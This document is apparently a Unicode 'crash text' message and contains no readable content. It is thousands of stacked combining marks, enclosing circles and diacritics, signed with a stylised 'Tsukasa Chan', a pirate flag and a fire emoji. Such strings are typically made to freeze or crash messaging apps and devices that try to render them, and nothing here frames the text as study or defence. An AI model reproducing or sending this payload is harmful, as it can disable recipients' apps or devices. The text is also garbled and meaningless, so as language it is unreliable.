⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝.⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙ุᡃᡃᡃᡃᡃᡃᡃᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ<\ 𝕿𝖘𝖚𝖐𝖆𝖘𝖆͜͡ 𝕮𝖍𝖆𝖓.々ʹ⁩𝜘͢͢ۦོ͢⇣͢✰͢ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝.⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙ุᡃᡃᡃᡃᡃᡃᡃᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ✘͢͢ۦོ͢⇣͢✰͢↬🏴‍☠️⃢🔥⃪⃙⃘⃚⃙⃪⃙⃙⃚⃘⃚ִֵֵֶֶֶࣱࣱࣱࣱࣱࣱࣱࣱࣲࣲٍࣲࣲࣲࣲࣲࣲٍٍ໊໊໊໊̡̡̡̡̹̹̹̹̹̹̹̹̹̹̹̹̹̹̹͓͓͓͓͓͙͙͙࡙ࣺࣺࣺࣺࣺࣺࣺࣺࣺࣺࣺࣺࣺࣺࣺ̤̤̤ۣۣ࡙࡙࡙࡙࡙࡙࡙ۣۣٕٕۣۣۣۣۣۣࣦࣦࣦࣦࣦ̹̹̺͍͍͍͍̺̺̺̺̺̺ۣۣ͓⃭⃮⃯⃬⃯⃮⃭⃬⃬⃭⃮⃯֮֮֮֮֮͗͗͗͗͗͗͗͗͗͗͗͗͗͗͗͗͗͗ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧͣͣͭͫͫͣͥͬͬ͒͒͒͛͛͛ࣽࣳࣾࣾࣾࣾࣾࣾࣾࣳࣳࣳٝ݊݊݊݊ܶܶࣸࣸࣨࣵࣵࣵܶܶܽܽࠦ݅࠭࣬͛͛ࣧࣽࣽ֔֔݉݉݉֠͂ͬͥ͋͋⃔⃕⃖⃗⃔⃡⃩⃑⃐⃛⃜⃔⃕⃖⃗⃩⃛⃜⃛⃜⃔⃕⃛⃜⃔⃖⃗⃑⃡⃩⃡⃑⃔⃜⃕⃖⃗⃑